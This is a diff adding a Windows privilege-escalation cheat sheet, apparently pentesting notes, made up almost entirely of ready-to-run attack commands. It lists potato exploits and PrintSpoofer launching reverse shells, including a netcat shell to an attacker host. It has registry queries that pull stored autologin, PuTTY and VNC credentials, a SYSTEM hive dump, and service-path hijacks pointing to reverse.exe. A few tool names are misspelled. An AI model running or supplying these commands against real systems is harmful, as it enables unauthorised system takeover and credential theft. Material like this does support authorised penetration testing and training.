@@ -1,0 +1,46 @@
+
+accesschk
+Check writable permissions for user:accesschk.exe \\accepteula -wvu "\<path\>"
+Check registry key permissions:accesschk /acceptula -uvwqk \<path of registry\>
+GodPotato
+Execute command with GodPotato:GodPotato.exe -cmd "cmd /c whoami"
+Execute reverse shell with GodPotato:GodPotato.exe -cmd "shell.exe"
+icalcs
+Check folder permissions:icalcs "path"
+JuicyPotatoNG
+Execute command with JuicyPotatoNG:JuicyPotatoNG.exe -t \* -p "shell.exe" -a
+PrintSpoofer
+Impersonate system (powershell):PrintSpoofer.exe -i -c powershell.exe
+Impersonate system (reverse shell):PrintSpoofer.exe -c "nc.exe \<lhost\> \<lport\> -e cmd"
+reg
+Query registry for AlwaysInstallElevated (HKCU):reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+Query registry for AlwaysInstallElevated (HKLM):reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+Query autorun programs (HKCU):reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+Query autorun programs (HKLM):reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+Query registry for service executable path:reg query \<reg-path\>
+Modify service ImagePath in registry:reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG\_EXPAND\_SZ /d C:\\PrivEsc\\reverse.exe /f
+Search HKLM for 'password':reg query HKLM /f password /t REG\_SZ /s
+Query winlogon credentials:reg query "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"
+Query Putty sessions:reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
+Query Putty session details:reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s | findstr "HKEY\_CURRENT\_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
+Query VNC password:reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
+Query TightVNC settings:reg query "HKCU\\Software\\TightVNC\\Server"
+Query Windows autologin credentials:reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"
+Find Windows autologin credentials:reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2\>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+Query SNMP parameters:reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"
+Search HKCU for 'password':reg query HKCU /f password /t REG\_SZ /s
+Save SYSTEM hive backup:reg.exe save hklm\\system c:\\system.bak
+RoguePotato
+Execute command with RoguePotato:RoguePotato.exe -r \<AttackerIP\> -e "shell.exe" -l 9999
+runas
+Execute command as user with saved credentials:runas /savecred /user:admin C:\\Temp\\reverse.exe
+sc
+Query service binary path:sc qc \<servicename\>
+Modify service binary path:sc config \<service\> \<option\>="\<value\>"
+Start service:sc start \<servicename\>
+schtasks
+Query scheduled tasks (list format):schtasks /query /fo LIST /v
+SharpEfsPotato
+Execute command with SharpEfsPotato (write output):SharpEfsPotato.exe -p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a "whoami | Set-Content C:\\temp\\w.log"
+wmic
+Find unquoted service paths:wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v """
